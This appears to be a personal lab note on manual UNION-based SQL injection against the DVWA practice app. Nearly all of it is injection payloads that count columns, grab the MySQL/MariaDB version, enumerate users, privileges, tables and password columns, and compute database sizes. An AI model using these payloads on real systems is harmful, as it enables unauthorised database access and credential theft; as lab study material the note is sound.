# 01 - Database Reconnaissance

Search Tag(s): #sql-injection #union #enumeration-and-discovery #dvwa

## 1.1 - Columns Enumeration

^78ef92

### 1.1.1 - ORDER BY Detection

- We need to determine number of columns before we perform the next step.

```sql
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

- Keep enumerating it until you've triggered an error.

![[1.1 - ORDER BY Enumerate One Field.png]]

```
Unknown column '3' in 'order clause'
```

- 3 - 1 = 2. We have two columns.

- You can also to enumerate is to end it at 100 fields.

```sql
' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100#
```

### 1.1.2 - GROUP BY Detection

- You can enumerate it with **GROUP BY** method and you'll get the same results.

```sql
' GROUP BY 1#
' GROUP BY 2#
' GROUP BY 3#
```

- You can also to enumerate is to end it at 100 fields.

```sql
' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100#
```

### 1.1.3 - UNION Detection

```sql
' UNION SELECT 1, 2#

' UNION SELECT 1, 2, 3#

' UNION SELECT NULL, NULL#

' UNION SELECT NULL, NULL, NULL#
```

## 1.2 - Enumeration and Discovery

### 1.2.1 - UNION Enumeration

#### 1.2.1.1 - Banner Grab

Sometimes when we try to retrieve error messages. Sometimes the warning messages may not provide us the SQL server software might be running. However, we can discover it even further to grab the version of the DBMS back-end software is running.

```sql
' UNION SELECT 1, @@VERSION#

' OR 1=1 UNION SELECT 1, @@VERSION#

' UNION SELECT NULL, @@VERSION#

' OR 1=1 UNION SELECT NULL, @@VERSION#
```

- The DBMS server is MariaDB which is a fork of MySQL.

![[1.2 - Banner Grab.png]]

#### 1.2.1.2 - Current Database

```sql
' UNION SELECT NULL, DATABASE()#
```

- The current database is `dvwa`

![[1.3 - Current Database.png]]

#### 1.2.1.3 - Current Database User

```sql
' UNION SELECT NULL, USER()#
```

- The current database is `dvwa@localhost`.

![[1.4 - Current User.png]]

- Check the current database user is DBA (database administrator).

```sql
' UNION SELECT super_priv, NULL FROM mysql.user WHERE user = 'dvwa'#

' UNION SELECT CONCAT(user, '->', 'SUPER', '->', super_priv), NULL FROM mysql.user WHERE user = 'dvwa'#

' UNION SELECT GROUP_CONCAT(user, '->', 'SUPER', '->', super_priv), NULL FROM mysql.user WHERE user = 'dvwa'#
```

![[1.5 - DBA User.png]]

#### 1.2.1.4 - Enumerate DBMS Users

- Enumerate DBMS users.

```sql
' UNION SELECT user, NULL FROM mysql.user#

' UNION SELECT GROUP_CONCAT(user), NULL FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SUPER' AND GRANTEE LIKE "'dvwa'%"#
```

![[1.6 - Enumerate DBMS Users.png]]

- Enumerate DBA users.

```sql
' UNION SELECT GROUP_CONCAT(user, '->', 'SUPER', '->', super_priv, '\n'), NULL FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SUPER'#
```

![[1.7 - Enumerate DBA Users.png]]

#### 1.2.1.5 - Schema Database Enumeration

```sql
' UNION SELECT NULL, schema_name FROM information_schema.schemata#
```

![[1.8 - Enumerate Databases.png]]

Let's enumerate the tables.

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables#

' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
```

![[1.9 - Enumerate Tables With The Current Database.png]]

You can narrow it down.

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE 'user%'#
```

Let's note down the tables we've discovered that are potential to retrieve data.

```
users
```

Let's enumerate the columns.

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns#

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users'#
```

![[1.10 - Enumerate Columns With The Current Database.png]]

Let's note down the columns we've discovered that are potential to retrieve data

```
user
password
```

## 1.2 - Calculate Size

### 1.2.1 - Database Size

#### 1.2.1.1 - All Databases

- Bytes

```sql
' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 , 2) FROM information_schema.tables#

' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#

' UNION SELECT NULL, GROUP_CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
```

- Kilobytes

```sql
' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 , 2) FROM information_schema.tables GROUP BY table_schema#

' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#

' UNION SELECT NULL, GROUP_CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
```

- Megabytes

```sql
' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) FROM information_schema.tables GROUP BY table_schema#

' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#

' UNION SELECT NULL, GROUP_CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
```

#### 1.2.1.2 - Current Database

- Bytes

```sql
' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
```

- Megabytes

```sql
' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
```

- Gigabytes

```sql
' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
```

---
## References

- [Hacking Articles: Form Based SQL Injection Manually](https://www.hackingarticles.in/form-based-sql-injection-manually/)

- [PayloadsAllTheThings SQL Injection: MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)